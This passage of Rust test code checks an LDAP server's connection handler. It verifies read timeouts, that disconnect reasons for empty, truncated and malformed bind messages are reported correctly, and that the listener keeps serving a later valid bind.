            let (_shutdown_sender, shutdown) = watch::channel(false);

            let connection: Connection = Connection {
                id: 1,
                peer,
                events: sender,
                shutdown,
                read_timeout: Duration::from_millis(50),
                raw: false,
            };

            let task: JoinHandle<io::Result<()>> = tokio::spawn(connection.run(stream));

            if partial {
                client.stream.write_all(&SIMPLE_BIND[..10]).await.unwrap();
            }

            time::timeout(TEST_TIMEOUT, task)
                .await
                .unwrap()
                .unwrap()
                .unwrap();

            client.assert_connection_closed().await;

            let mut timed_out: bool = false;

            while let Some(event) = events.recv().await {
                timed_out |= matches!(
                    event.kind,
                    LdapEventKind::Disconnected {
                        reason: DisconnectReason::ReadTimeout
                    }
                );
            }

            assert!(timed_out);
        }
    }

    #[tokio::test]
    async fn termination_events_distinguish_eof_from_malformed_messages() {
        let mut harness: TestServer = TestServer::start().await;
        let mut invalid_authentication: Vec<u8> = SIMPLE_BIND.to_vec();
        invalid_authentication[4] = 5;
        invalid_authentication[17] = 0xa0;

        let cases: [(&[u8], DisconnectReason); 4] = [
            (b"", DisconnectReason::PeerClosed),
            (
                b"\x30\x00",
                DisconnectReason::DecodeFailed(DecodeError::new(
                    DecodeErrorReason::TruncatedElement,
                )),
            ),
            (
                &SIMPLE_BIND[..10],
                DisconnectReason::DecodeFailed(DecodeError::new(
                    DecodeErrorReason::IncompleteMessage { received: 10 },
                )),
            ),
            (
                &invalid_authentication,
                DisconnectReason::DecodeFailed(
                    DecodeError::new(DecodeErrorReason::UnrecognizedAuthenticationTag {
                        tag: 0xa0,
                    })
                    .with_context(Some(5), Some(0x60)),
                ),
            ),
        ];

        for (packet, expected_reason) in cases {
            let mut client: Client = Client::connect(harness.address).await;
            client.stream.write_all(packet).await.unwrap();
            client.stream.shutdown().await.unwrap();
            client.assert_connection_closed().await;

            let reason: DisconnectReason = time::timeout(TEST_TIMEOUT, async {
                loop {
                    let event: LdapEvent = harness
                        .events
                        .recv()
                        .await
                        .expect("expected disconnect event");

                    match event.kind {
                        LdapEventKind::BindReceived(_) => panic!("malformed input produced a Bind"),
                        LdapEventKind::Disconnected { reason } => return reason,
                        _ => {}
                    }
                }
            })
            .await
            .unwrap();

            assert_eq!(reason, expected_reason);
        }

        // Closing malformed sessions must not stop the listener.
        let mut healthy: Client = Client::connect(harness.address).await;
        healthy
            .send(
                9,
                simple_bind_request("cn=alice,dc=example,dc=com", "secret"),
            )
            .await;
        healthy.assert_bind_response(9, ResultCode::Success).await;
        harness.receive_bind(9).await;
        harness.shutdown().await;
    }
}
